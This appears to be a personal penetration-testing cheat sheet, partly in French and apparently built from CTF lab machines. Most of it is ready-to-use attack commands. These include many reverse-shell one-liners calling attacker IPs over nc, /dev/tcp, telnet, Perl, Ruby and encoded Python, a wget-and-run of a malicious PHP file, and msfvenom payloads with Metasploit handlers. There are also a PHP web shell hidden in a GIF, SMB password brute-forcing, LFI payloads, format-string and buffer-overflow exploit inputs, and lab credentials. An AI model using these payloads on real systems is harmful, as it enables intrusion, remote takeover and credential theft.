https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
https://tools.kali.org/tools-listing



==PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH=/tmp:$PATH


==Web Applications
    -dirb
    -gobuster
    -wfuzz
        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
    -niko -h 192.168.110.48
    -uniscan

    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ/
    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
    dirsearch.py -u http://192.168.110.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 

# Gobuster 3
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.110.48 -x html,php -t 20
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php -k

curl -v http://10.10.10.10/robots.txt
curl -k -v https://10.10.10.10/robots.txt
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt

curl -v -X OPTIONS http://10.10.10.10/test




===Transfer file with nc
1) reciever
    nc -l -p 1234 -q 1 > archive.tar.gz < /dev/null
    nc -l -p 1234 -q 1 | uncompress -c | tar xvfp -
    nc -l -p 1234  -q 1 | gunzip > asroot
    nc -l -p 1234  -q 1 | tar zxv
    nc 10.0.1.1 1234 > linpeas.sh


3) sender
    cat archive.tar.gz | nc a.b.c.d 1234
    tar cfp - /some/dir | compress -c |  nc a.b.c.d 1234
    gzip -c /tmp/asroot | nc a.b.c.d 1234
    tar czp /tmp/directory | nc a.b.c.d 1234
    nc -l -p 1234 -q 1 < linpeas.sh 

==transfer file xxd, base64
    
    xxd -p -c 36 binary
    head binary.xxd
    7f454c460101010000000000000000000200030001000000c08604083400
    cat binary.xxd | xxd -r -p > binary

    base64 -w 0 binary
    echo -ne f0VMRgEBAQAAAAAAAAAAAAIAAwABA... | base64 -d > binary

===Tar file
1) create
    tar -czvf file.tar.gz /path/to/dir1
2) list the contents of a tar file
    tar -ztvf file.tar.gz
3) extract a tar flile
   1> tar -xvf file.tar.gz
   2> tar -xzvf file.tar.gz
   3> tar -xzvf file.tar.gz -C /tmp/

===Version 
uname -a
lsb_release -a
cat /etc/release
cat /etc/*release
cat /etc/issue
cat /etc/os-release
hostnamectl

===update shell
python -c 'import pty; pty.spawn("/bin/sh")'
python3.6 -c 'import pty; pty.spawn("/bin/sh")'


===knock port

for x in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x server_ip_address; done




for PORT in $PORT1 $PORT2 $PORT3; do nc -vz $SSH_HOST $PORT; done; ssh $SSH_USER@SSH_HOST


nc 192.168.1.102 4000
nc 192.168.1.102 5000
nc 192.168.1.102 6000

https://github.com/grongor/knock/blob/master/knock

=== copy file
base64 -w 0 file 
echo "..." | base64 -d > file

===Display available network interfaces
ip link show
nmcli device status / nmcli connection show
netstat -i
ifconfig -a
===Routing table
ip r
=== ARP cache
arp 
arp -a
arp -e
arp -n

===Crypt - uncrypt
https://hashes.com/en/decrypt/hash
cyberchef : gchq.github.io
http://rumkin.com/tools


=== spawning shells
https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
#1
nc <attacker_ip> <port> -e /bin/bash
#2
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#3
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.1.1/1234 0>&1'"); ?>
#4
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe

RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF

#5
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
#7
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php

=== Write in some sensitive file
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq

for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user

===spawn shell

https://netsec.ws/?p=337
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat%20target=

python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'

perl - exec "/bin/sh";

ruby - exec "/bin/sh"

lua - os.execute('/bin/sh')
IRB - exec "/bin/sh"

vi - :!bash

vi - :set shell=/bin/bash:shell

nmap - !sh

=== Server
python3 -m http.server 8888 --directory /home/kali/OSPC/Tools/


=== Check privilegessocat TCP-LISTEN:1234,reuseaddr,for

http://www.securitysift.com/download/linuxprivchecker.py
https://github.com/cervoise/linuxprivcheck
https://github.com/rebootuser

===port forwarding 

==== Socat

socat TCP-LISTEN:<<Straylight_TCP_PORT>>,fork,reuseaddr TCP:<<Neuromancer_IP_address>>:<<Neuromancer_TCP_PORT>> &
socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.212.4:8009 &

==== ssh
ssh -N -f  -L 8080:internalTarget:80 user@compromisedMachine
ssh -N -f  -L 8080:internalTarget:22 user@compromisedMachine
ssh -N -f -R 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key

kali> ssh -N -f -L 9000:cible.ip:22 root@pivot.ip

pivot> ssh -N -f -R 2222:cible.ip:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@attacker.ip 

==== Meterpreter session

portfwd add -l 3306 -p 3306 -r 172.28.128.3
portfwd list
portfwd flush

    


===detecte open ports

for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "refused"

for i in $(seq 1 65535); do nc -nvz -w 1 127.0.0.1 $i 2>&1; done | grep -v "refused"
===netstat
netstat -i
netstat -antp | grep 1234
netstat -lnp tcp


==



bash -i> /dev/tcp/192.168.110.1/4444 0>&1

set payload php/meterpreter/reverse_tcp



===msfvenom

https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/
https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/
https://pravinponnusamy.medium.com/reverse-shell-payloads-969366fa5aff

msfvenom -a x86 --platform linux -p linux/x86/exec -f py -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true


msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null


msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R
0<&21-;exec 21<>/dev/tcp/192.168.110.1/443;sh <&21 >&21 2>&21

msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.1 lport=443 R
mkfifo /tmp/fond; nc 192.168.1.1 443 0</tmp/fond | /bin/sh >/tmp/fond 2>&1; rm /tmp/fond
msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
nc 192.168.1.1 443 -e /bin/sh

msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.1 lport=443 R
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"

msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.1 lport=443 R
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.1","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'



msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev


=== Meterpreter

msfvenom --platform linux --arch x86 --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 --format elf --out rev

msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.110.1
msf6 exploit(multi/handler) > run


msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f raw -o rev.php

msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.110.1
msf6 exploit(multi/handler) > run


msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.110.1
msf6 exploit(multi/handler) > run

nc 192.168.110.1 4444 -e /bin/sh



=== Shell

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf > shell-x86.elf

use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.110.1
msf6 exploit(multi/handler) > run



msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x64 --platform linux -f elf -o rev
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -a x86 --platform linux -f elf -o rev
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.227.1 LPORT=443 -o shell.php

msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp -f elf -a x86 -o rev1


=====Tomcat

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war



cd /usr/share/metasploit-framework/modules/payloads/singles/cmd/unix


===SMB
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

enum4linux 192.168.110.46
nmblookup -A 192.168.1.17
nbtscan 192.168.1.17
nbtstat -A 192.168.1.17
smbmap -H 192.168.110.46
smbmap -H 192.168.110.46 -u helios -p qwerty

smbclient -L 192.168.110.46
smbclient //192.168.110.46/helios
get file.txt

smbclient //10.10.10.9/share$


smbclient //192.168.110.46/helios -U helios
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *


Password Cracking
https://www.hackingarticles.in/password-crackingsmb/
Hydra
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
hydra -e nsr -u -l <username> -P passwd.txt 192.168.1.105 smb -V -f
Ncrack
ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
Medusa
medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
medusa -u <username> -P passwd.txt -h 192.168.1.105 -M smbnt

Metasploit
use auxiliary/scanner/smb/smb_login
msf exploit (smb_login)>set rhosts 192.168.1.118
msf exploit (smb_login)>set user_file /root/Desktop/user.txt
msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
msf exploit (smb_login)>set stop_on_success true
msf exploit (smb_login)>exploit

===Wordpress
$P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456


===
msf5 > use exploit/multi/script/web_delivery
msf5 exploit (multi/script/web_delivery) > set target 1
msf5 exploit (multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
msf5 exploit (multi/script/web_delivery) > set lhost 192.168.1.105
msf5 exploit (multi/script/web_delivery) > exploit


===Joomla

droopescan


=Bash

==Bash boucle immit command line, curl post request

#!/bin/bash

HOST=192.168.110.11
SHELL=dev_shell.php
printf "$ "
while read line
do
    if [[ "$line" == "exit" ]]; then
        break
    fi
    curl -s --data-urlencode "in_command=$line" http://$HOST/$SHELL | sed '/<h5>/,/<\/div>/!d' | sed -r -e '1d' -e '$d' -e 's/^\s+//'
    printf "$ "
done < "/proc/${$}/fd/0"


==authenticate + cookie + exploit
#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
FILE=$1

# authenticate
curl \
    -s \
    -c cookie \
    -d "log=$USER&pwd=$PASS&wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

# exploit
curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie




##
# Glasgow Smile 2 Authentication Script
#
#########################################################################################################################
##
#script for authentication in progress. At the moment it only works with a single command.

curl -u user:password http://localhost/Glasgow---Smile2/
# Don't use commands like that in automated scripts, I saved a file with some network traffic packets captured.
# Analyze it and delete the script.I don't have permission to do it. Stupid Asshole.

# Base URL of your web site.
#site_url="http://example.com"

# Endpoint URL for login action.
#login_url="$site_url/service/path/user/login"


# Path to temporary file which will store your cookie data.
#cookie_path=/tmp/cookie

# URL of your custom action.
#action_url="$site_url/service/path/custom/action"

# This is data that you want to send to your custom endpoint.
#data="name=Alex&hobby=Drupal"

##
# Logic. Most likely you shouldn't change here anything.
##

# Get token and construct the cookie, save the returned token.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Authentication. POST to $login_url with the token in header "X-CSRF-Token: $token".
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "username=$username&password=$password" "$login_url" -s

# Get new token after authentication.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Send POST to you custom action URL. With the token in header "X-CSRF-Token: $token"
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "$data" "$action_url" -s



=Python


== read from sys.stdin

import sys

for line in sys.stdin:
    line = line.rstrip()
    if 'exit' == line.rstrip():
        break
    print(f'Processing Message from sys.stdin *****{line}*****')
print("Done")

== input

#!/usr/bin/python3
import requests as req
import re

host='http://192.168.90.104/nomercy/windows/code.php?file=../../../../../../../../..'

while True:
    command=input("file: ")
    combined=host+command
    resp = req.get(combined)
    content = resp.text
    stripped = re.sub('<[^<]+?>', '', content)
    clean = re.sub('<?', '', stripped)
    print(clean)



== Extract code in html code
sed -n '/<xxxxx/,/<\/xxxxx/p'
sed -n '/<div id="footer"/,/<\/div/p'
sed 's/^@\(.*\)/\1/' # delete @ at the begining of lines


==nmap



==Steganography

exiftool
steghide
    steghide embed -ef <txt filename> -cf <media filename>
    steghide extract -sf <media filename>
    steghide embed -ef <txt filename> -cf <media filename> -p  <password>
    steghide info <media filename>
 stepic -d -i kvasir.png | xxd -p -r > k.png

==wordslist

SecList
Rockyou
nmap


==Generate password for /etc/passwd
https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow

openssl passwd -6 -salt xyz  yourpass
    -1 : MD5 password,
    -5 a SHA256 
    -6 SHA512 
mkpasswd --method=SHA-512 --stdin
    --method=md5
    --method=sha-256
    --method=sha-512

===visudo

bttai   ALL=(ALL) NOPASSWD: ALL



==GIF backdoor file
echo 'FFD8FFEo' | xxd -r -p > test.gif
echo '<?php $c=$_GET['c']; echo `$c`; ?>' >> test.gif


GIF89a<?php
echo 'hi';

http://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru
+----------------+-----------------+----------------+---------------+
|    Command     | Displays Output | Get Output     | Get Exit Code |
+----------------+-----------------+----------------+---------------+
| system()       | Yes (as text)   | Last line only | Yes           |
| passthru()     | Yes (raw)       | No             | Yes           |
| exec()         | No              | Yes (array)    | Yes           |
| shell_exec()   | No              | Yes (string)   | No            |
| backticks (``) | No              | Yes (string)   | No            |
+----------------+-----------------+----------------+---------------+


==reverse enginneer
https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md

cat /proc/sys/kernel/randomize_va_space

gcc pwnme.c -o pwnme -fno-stack-protector
gcc pwnme.c -o pwnme -fno-stack-protector -z execstack

msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b "\x00\x0a\0d"

checksec
strace, ltrace, ptrace
ltrace <binary>
objdump -d <binary> -M intel
objdump -d <binary> -M intel | grep -e "cal.*eax" --color
objdump -d agent | less -p .text
objdump -D <binary> | grep call| grep eax
00 termination 
0a carriage return
0d line feed

JMP EAX” or “CALL EAX”
gdb-peda$ asmsearch "call eax"
gdb-peda$ asmsearch "jmp esp"

gdb-peda$ find "\xff\xd4" binary

gdb-peda$ find "\xff\xe4" binary

=== Local File Inclusion (LFI) Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
https://highon.coffee/blog/lfi-cheat-sheet/

Path Traversal aka Directory Traversal
    /etc/passwd
    ../../../etc/passwd
PHP Wrapper expect:// LFI
    http://127.0.0.1/fileincl/example1.php?page=expect://ls

PHP Wrapper php://input
    http://192.168.183.128/fileincl/example1.php?page=php://input
    post data payload : <? system('uname -a');?>
                        <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>

PHP Wrapper php://filter
    http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

/proc/self/environ LFI Method
/proc/self/fd/ LFI Method

https://tools.kali.org/web-applications/uniscan
sudo uniscan





===Identifier les méthodes HTTP autorisées


curl -X OPTIONS http://example.org -i



===tcpdump

sudo tcpdump -i vboxnet0 icmp -X

https://danielmiessler.com/study/tcpdump/


===Escape jail

https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
- rbash : ssh avida@192.168.110.38 -t "/bin/bash --noprofile"
- ftp : 
    -rbash-4.1$ ftp 
    ftp> !
    +rbash-4.1$ /bin/bash
- nano :
    nano -s /bin/bash
    /bin/bash
    ^T
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash



== Desactive ASLR

maximize the stack 

```console
mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
```

== Format string vulnerability

```c

#vuln
printf(string)

#secure
printf("%s", string)

```

%x : exame stack memory
%s : read from arbitrary memory address
%n : write to abitrary memory address
%4$x ~ %x%x%x%x
%4$n ~ %x%x%x%x%n
addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"


```py

import struct

def p(x):
        return struct.pack('<L', x)

input0 = "AAAA.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x"

addr = p(0x0804a024)

addr1 = p(0x0804a024)
addr2 = p(0x0804a025)
addr3 = p(0x0804a026)
addr4 = p(0x0804a027)


input1 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%x"
input2 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%n"
input3 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%64x.%n"

#0xaabbccdd
input4 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%40x.%n%17x%n%17x%n%17x%n"

#0xdeadbeef
input5 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%109x.%n%207x%n%239x%n%49x%n"

#0x0806abcd
input6 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%75x.%n%222x%n%91x%n%258x%n"

input7 = "AAAA" + "%11$08x"
input8 = addr  + "%11$n"
input9 = addr  + "%166x%11$n"
input10 = addr1 + addr2 + addr3 + addr4 +"%98x%11$n%139x%12$n%194x%13$n%64x%14$n"


input11 = addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"


print input11

```


= GIT
== List of current files on git directory
git ls-tree -r master --name-only


= Buffers overflow

https://guif.re/bo

1- Identification fuzz
2- Finding EIP : pattern_create
3- Finding JMP ESP
4- Finding bad characters
5- Injecting a shellcode


gdb-peda$ asmsearch "jmp esp"
gdb-peda$ asmsearch "call esp"
gdb-peda$ find "\xff\xd4" binary
gdb-peda$ find "\xff\xe4" binary





= Scan IP

#!/bin/bash
TF=$(mktemp -u)
touch $TF
is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
}

for i in 192.168.0.{1..254} 
do
is_alive_ping $i & disown
done
sleep 1
cat $TF
rm $TF

 == Scan ports

 for i in $(seq 1 65535); do nc -z -v 192.168.3.50 $i 2>&1 | grep 'open'; done



==ROT13

```console

 tr 'A-Za-z' 'N-ZA-Mn-za-m'

```


== SED

```console

sed 's/<pre>/<pre>\n/g' 

```

Garder seuelement le texte entre <pre> text </pre>

```console

sed -e 's/<[^>]*>//g'

```
Supprimer toutes les balises


```console

sed -r -e '1d' -e '$d' -e 's/^\s+//'

```

Supprimer la première ligne et la dernière ligne




## scan ports

for i in $(seq 1 65535); do nc -z -v 192.168.2.200 $i 2>&1 | grep 'open'; done




==
find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;



===LDAP

ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 



=== Peut-être
for file in $(find . -name '*.php'); do cat $file; done
grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'